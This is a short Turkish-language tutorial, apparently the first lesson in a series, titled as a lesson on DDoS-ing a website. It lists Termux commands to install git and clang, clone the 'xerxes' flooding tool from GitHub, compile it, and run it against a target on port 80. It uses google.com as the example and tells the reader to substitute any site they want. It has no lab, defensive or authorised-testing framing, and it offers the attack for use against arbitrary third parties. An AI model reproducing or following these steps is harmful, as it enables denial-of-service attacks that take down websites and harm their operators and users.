1.ders  siteye ddos atma :


Ddos atmak için öncelikle Termuxu açın;
vericeğim kodları sırasıyla yapın eğer  videodaki kodları anlıyamadısanız sırasıyla bu kodları girin.
Kodların hepsi küçük harfle yazılıcak!!!

Komutlar;

1) pkg install git
2) pkg install clang
3) git clone https://github.com/zanyarjamal/xerxes
4) clear
5) cd
6) ls
7) cd xerxes
8) ls
9) chmod 777 xerxes.c
10) clang xerxes.c -o xerxes
11) ./xerxes  www.google.com 80

(Buraya dikkat   ./xerxes ten sonra googlenin urlsi yerine istediğiniz siteyi yazın ama başında  https:// olmadan  ve site urlsinin
sonuna boşluk bırakıp  80   katıyoruz.)

Programı Kolay Yoldan Çalıştırma ;

1)cd xerxes
2)clang xerxes.c -o xerxes   
3)./xerxes www.google.com 80



                                                                                                              < <<<<< <:  iyi dersler    bir sonraki derse geçin:>>>>>>>